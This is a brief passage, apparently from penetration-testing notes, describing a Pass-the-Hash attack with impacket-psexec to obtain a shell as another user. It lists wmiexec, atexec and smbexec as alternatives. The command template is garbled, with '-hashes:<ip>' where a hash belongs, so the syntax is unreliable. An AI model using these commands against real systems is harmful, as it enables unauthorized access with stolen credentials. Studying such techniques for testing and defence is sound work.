...
-Passing the Hash with Impacket-PsExec:
By using impacket-psexec, we can perform Pass The Hash attack and obtain a shell in that specific user's context:
```
impacket-psexec <accountname>@<ip> -hashes:<ip>
#We also have 3 more tools that does the same with different service
#impacket-wmiexec
#impacket-atexec
#impacket-smbexec
```
